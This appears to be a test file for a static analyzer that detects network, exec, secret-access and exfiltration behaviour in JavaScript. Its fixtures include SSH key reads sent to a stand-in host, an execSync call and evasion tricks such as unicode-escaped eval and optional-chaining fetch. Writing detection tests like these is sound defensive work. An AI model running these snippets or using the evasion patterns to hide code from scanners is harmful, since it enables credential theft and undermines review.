import { test, expect } from "bun:test";
import { inspect } from "./analyze";

const caps = (c: string) => new Set(inspect(c).capabilities);
const unv = (c: string) => inspect(c).unverifiable;
const risks = (c: string) => new Set(inspect(c).risks);

// #2/#3 optional chaining false-safes
test("fetch?.() is detected as NETWORK", () => {
  expect(caps('fetch?.("http://x/" + s);').has("NETWORK")).toBe(true);
});
test("process?.env is detected as ENV_SECRETS", () => {
  expect(caps("const x = process?.env?.SECRET;").has("ENV_SECRETS")).toBe(true);
});

// #1 division after postfix ++ must not swallow a require as a regex
test("require after postfix ++ is not swallowed as a regex", () => {
  expect(caps('let i = 0; i++ / require("child_process").execSync("id") / 1;').has("EXEC")).toBe(true);
});

// #4 unicode-escaped identifier
test("unicode-escaped identifier is UNVERIFIABLE", () => {
  expect(unv('\\u0065val("x");')).toBe(true);
});

// #5 secret path inside a string (no filesystem use) must NOT fire EXFILTRATION
test("secret path in a log string without fs use does not fire EXFILTRATION", () => {
  const code = 'console.log("Configure ~/.ssh/config first");\nfetch("https://docs.example.com");';
  expect(risks(code).has("EXFILTRATION")).toBe(false);
});
test("a real secret-file read + network still fires EXFILTRATION", () => {
  expect(risks('const fs=require("fs");fs.readFileSync("/h/.ssh/id_rsa");fetch("http://x");').has("EXFILTRATION")).toBe(true);
});

// #6 object key { require: ... } must not be opacity
test("object key {require:...} is not flagged as opacity", () => {
  expect(unv('const p = { require: "./cjs", import: "./mjs" };')).toBe(false);
});

// #7 function fetch(){} declaration is not a NETWORK use
test("function fetch declaration is not NETWORK", () => {
  expect(caps("function fetch(url) { return url; }").has("NETWORK")).toBe(false);
});

// regression: indirect optional member require stays UNVERIFIABLE
test("module?.require optional member is still UNVERIFIABLE", () => {
  expect(unv('module?.require("fs");')).toBe(true);
});
